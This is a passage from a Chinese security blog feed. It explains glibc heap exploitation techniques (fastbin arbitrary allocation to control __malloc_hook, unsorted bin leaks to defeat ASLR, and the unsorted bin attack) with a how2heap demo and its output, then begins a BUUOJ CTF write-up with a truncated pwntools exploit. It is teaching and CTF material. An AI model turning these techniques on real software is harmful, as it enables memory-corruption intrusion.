class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0<br></code></pre></div></td></tr></table></figure><p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//这里的size指用户区域，因此会小于2倍SIZE_SZ</span><br>Fastbins[idx=<span class="hljs-number">0</span>, size=<span class="hljs-number">0x10</span>]<br>Fastbins[idx=<span class="hljs-number">1</span>, size=<span class="hljs-number">0x20</span>]<br>Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>]<br>Fastbins[idx=<span class="hljs-number">3</span>, size=<span class="hljs-number">0x40</span>]<br>Fastbins[idx=<span class="hljs-number">4</span>, size=<span class="hljs-number">0x50</span>]<br>Fastbins[idx=<span class="hljs-number">5</span>, size=<span class="hljs-number">0x60</span>]<br>Fastbins[idx=<span class="hljs-number">6</span>, size=<span class="hljs-number">0x70</span>]<br></code></pre></div></td></tr></table></figure><p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br><br>0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f<br></code></pre></div></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz)                                                      \</span><br><span class="hljs-meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></div></td></tr></table></figure><p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）</p><p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;<br> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax<br><span class="hljs-meta"></span><br><span class="hljs-meta"> $</span><span class="bash">rax   : 0x7ffff7dd1afd</span><br><br>0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f<br>0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f<br>0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000<br>0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000<br></code></pre></div></td></tr></table></figure><h3 id="小总结-2"><a href="#小总结-2" class="headerlink" title="小总结"></a>小总结</h3><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p><h2 id="具体题目遇到再说"><a href="#具体题目遇到再说" class="headerlink" title="具体题目遇到再说"></a>具体题目遇到再说</h2><h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。</p><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p><p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><p><strong>基本来源</strong> </p><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li></ol><h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><h3 id="Leak-原理"><a href="#Leak-原理" class="headerlink" title="Leak 原理"></a>Leak 原理</h3><p>如果我们可以把正确的 <code>fd</code> 指针 leak 出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过调试得出。而<code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code> 文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，实现对 <code>ASLR</code> 的绕过。</p><p>那么如何取得 <code>main_arena</code> 与 <code>libc</code> 基址的偏移呢？这里提供两种思路。</p><ol><li><strong>__malloc_trim 函数得出</strong> </li></ol><p>在 <code>malloc.c</code> 中有这样一段代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>__malloc_trim (<span class="hljs-keyword">size_t</span> s)<br>&#123;<br>  <span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (__malloc_initialized &lt; <span class="hljs-number">0</span>)<br>    ptmalloc_init ();<br><br>  mstate ar_ptr = &amp;main_arena;<span class="hljs-comment">//&lt;=here!</span><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      __libc_lock_lock (ar_ptr-&gt;mutex);<br>      result |= mtrim (ar_ptr, s);<br>      __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>      ar_ptr = ar_ptr-&gt;next;<br>    &#125;<br>  <span class="hljs-keyword">while</span> (ar_ptr != &amp;main_arena);<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>注意到 <code>mstate ar_ptr = &amp;main_arena;</code> 这里对 <code>main_arena</code> 进行了访问，所以我们就可以通过 IDA 等工具分析出偏移了。</p><p>比如把 <code>.so</code> 文件放到 IDA 中，找到 <code>malloc_trim</code> 函数，就可以获得偏移了。</p><ol start="2"><li><strong>__malloc_hook 直接算出</strong> </li></ol><p>比较巧合的是，<code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址，这样可以大幅减小工作量。以 pwntools 为例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">main_arena_offset = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></div></td></tr></table></figure><p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p><h3 id="实现-Leak-的方法"><a href="#实现-Leak-的方法" class="headerlink" title="实现 Leak 的方法"></a>实现 Leak 的方法</h3><p>一般来说，要实现 leak，需要有 <code>UAF</code>，将一个 <code>chunk</code> 放入 <code>Unsorted Bin</code> 中后再打出其 <code>fd</code>。一般的笔记管理题都会有 <code>show</code> 的功能，对处于链表尾的节点 <code>show</code> 就可以获得 <code>libc</code> 的基地址了。</p><p>特别的，<code>CTF</code> 中的利用，堆往往是刚刚初始化的，所以 <code>Unsorted Bin</code> 一般都是干净的，当里面只存在一个 <code>bin</code> 的时候，该 <code>bin</code> 的 <code>fd</code> 和 <code>bk</code> 都会指向 <code>main_arena</code> 中。</p><p>另外，如果我们无法做到访问链表尾，但是可以访问链表头，那么在 32 位的环境下，对链表头进行 <code>printf</code> 等往往可以把 <code>fd</code> 和 <code>bk</code> 一起输出出来，这个时候同样可以实现有效的 leak。然而在 64 位下，由于高地址往往为 <code>\x00</code>，很多输出函数会被截断，这个时候可能就难以实现有效 leak。</p><h2 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h2><p>在 <a href="https://code.woboq.org/userspace/glibc/">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/">malloc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">malloc.c</a> 中的 <code>_int_malloc</code> 有这么一段代码，当将一个 unsorted  bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></div></td></tr></table></figure><p>换而言之，如果我们控制了 <code>bk</code> 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。</p><blockquote><p>注意!!!这种检查从2.28版本开始, 本篇部分2.27已修改为2.28版本, 更新的有待更新</p></blockquote><p>这里我以 shellphish 的 how2heap 仓库中的 <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">unsorted_bin_attack.c</a> 为例进行介绍，这里我做一些简单的修改，如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span><br>                  <span class="hljs-string">&quot;unsigned long value into stack\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<br>      <span class="hljs-built_in">stderr</span>,<br>      <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span><br>      <span class="hljs-string">&quot;attacks, such as rewriting the &quot;</span><br>      <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> target_var = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>          <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,<br>          p);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid &quot;</span><br>                  <span class="hljs-string">&quot;consolidating the top chunk with&quot;</span><br>                  <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>  <span class="hljs-built_in">free</span>(p);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the &quot;</span><br>                  <span class="hljs-string">&quot;unsorted bin with its bk pointer &quot;</span><br>                  <span class="hljs-string">&quot;point to %p\n&quot;</span>,<br>          (<span class="hljs-keyword">void</span> *)p[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">/*------------VULNERABILITY-----------*/</span><br>  p[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span><br>                  <span class="hljs-string">&quot;victim-&gt;bk pointer\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span><br>                  <span class="hljs-string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,<br>          (<span class="hljs-keyword">void</span> *)p[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------------------------------</span><br><br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span><br>                  <span class="hljs-string">&quot;this time, target should has already been &quot;</span><br>                  <span class="hljs-string">&quot;rewrite:\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-keyword">void</span> *)target_var);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>程序执行后的效果为</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">➜  unsorted<span class="hljs-emphasis">_bin_</span>attack git:(master) ✗ gcc unsorted<span class="hljs-emphasis">_bin_</span>attack.c -o unsorted<span class="hljs-emphasis">_bin_</span>attack<br>➜  unsorted<span class="hljs-emphasis">_bin_</span>attack git:(master) ✗ ./unsorted<span class="hljs-emphasis">_bin_</span>attack<br>This file demonstrates unsorted bin attack by write a large unsigned long value into stack<br>In practice, unsorted bin attack is generally prepared for further attacks, such as <span class="hljs-emphasis">*rewriting the global variable global_max_fast*</span> in libc for further fastbin attack<br><br>Let&#x27;s first look at the target we want to rewrite on stack:<br>0x7ffe0d232518: 0<br><br>Now, we allocate first normal chunk on the heap at: 0x1fce010<br>And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()<br><br>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78<br>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br>And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508<br><br>Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:<br>0x7ffe0d232518: 0x7f1c705ffb78<br></code></pre></div></td></tr></table></figure><p>这里我们可以使用一个图来描述一下具体发生的流程以及背后的原理。</p><p><img src="../../image/glibc_malloc_srcCode/unsorted_bin_attack_order.png" alt="img"></p><p><strong>初始状态时</strong> </p><p>unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。</p><p><strong>执行 free(p)</strong> </p><p>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p><p><strong>修改 p[1]</strong> </p><p>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><strong>申请 400 大小的 chunk</strong> </p><p>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;<br>    bck = victim-&gt;bk;<br>    <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                        chunk2mem(victim), av);<br>    size = chunksize(victim);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">       only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">       runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">       exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">       no exact fit for a small chunk.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* 显然，bck被修改，并不符合这里的要求*/</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) &#123;<br>        ....<br>    &#125;<br><br>    <span class="hljs-comment">/* remove from unsorted list */</span><br>    unsorted_chunks(av)-&gt;bk = bck;<br>    bck-&gt;fd                 = unsorted_chunks(av);<br></code></pre></div></td></tr></table></figure><ul><li>victim = unsorted_chunks(av)-&gt;bk=p</li><li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li><li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li><li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);</li></ul><p><strong>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><p><strong>即修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。</strong> </p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">We</span> free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to <span class="hljs-number">0</span>x<span class="hljs-number">7</span>f<span class="hljs-number">1</span>c<span class="hljs-number">705</span>ffb<span class="hljs-number">78</span><br><span class="hljs-attribute">Now</span> emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br><span class="hljs-attribute">And</span> we write it with the target address-<span class="hljs-number">16</span> (in <span class="hljs-number">32</span>-bits machine, it should be target address-<span class="hljs-number">8</span>):<span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">0</span>d<span class="hljs-number">232508</span><br><br><span class="hljs-attribute">Let</span>&#x27;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:<br><span class="hljs-attribute">0x7ffe0d232518</span>: <span class="hljs-number">0</span>x<span class="hljs-number">7</span>f<span class="hljs-number">1</span>c<span class="hljs-number">705</span>ffb<span class="hljs-number">78</span><br></code></pre></div></td></tr></table></figure><p>这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。<strong>而且，需要注意的是，2.28版本已经无效</strong> </p><p>通过这个方法你可以 : </p><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>修改 heap 中的 <code>global_max_fast</code> 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li></ul><h1 id="bin-attack-总结"><a href="#bin-attack-总结" class="headerlink" title="bin attack 总结"></a>bin attack 总结</h1><ul><li>主要就是将bin的fd指针指向我们想要的位置, 从而在下次malloc中获得目标位置的chunk, 进一步修改目标地址<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>与上条类似，我们同样将分配作为content的chunk称为content chunk<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>为了方便，我们将分配作为note的chunk称为note chunk<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>src code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>glibc_malloc</tag>
      
      <tag>源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUOJ_Writeup</title>
    <link href="/2021-07/pwn-BUUOJ-writeup/"/>
    <url>/2021-07/pwn-BUUOJ-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前六道题小结-有点懒直接总结"><a href="#1-前六道题小结-有点懒直接总结" class="headerlink" title="1.前六道题小结:(有点懒直接总结)"></a>1.前六道题小结:(有点懒直接总结)</h2><ul><li>第一题测试nc命令</li><li>pwn1_sctf_2016: 一堆std::string啥的操作<strong>根本没看懂是什么</strong>.</li><li>ciscn_n_1: 栈溢出覆盖浮点数过if语句, 直接到IDA View查看十六进制的数值就可以了</li><li>剩下的几题太简单了(回头来看的题都是这么简单!) </li></ul><h2 id="2-ciscn-2019-c-1"><a href="#2-ciscn-2019-c-1" class="headerlink" title="2. ciscn_2019_c_1"></a>2. ciscn_2019_c_1</h2><ul><li>由于没有给出libc库以及libc库的版本, 所以git clone python的LibcSearcher库, 并且学习如何使用.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>ret_addr = <span class="hljs-number">0x4006b9</span> <span class="hljs-comment">#这两个是用ROPgadget找到的, 使用了ROPgadget --binary filename --only &quot;pop|ret&quot; | grep rdi命令</span><br>rdipop_addr = <span class="hljs-number">0x400c83</span><br><br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span 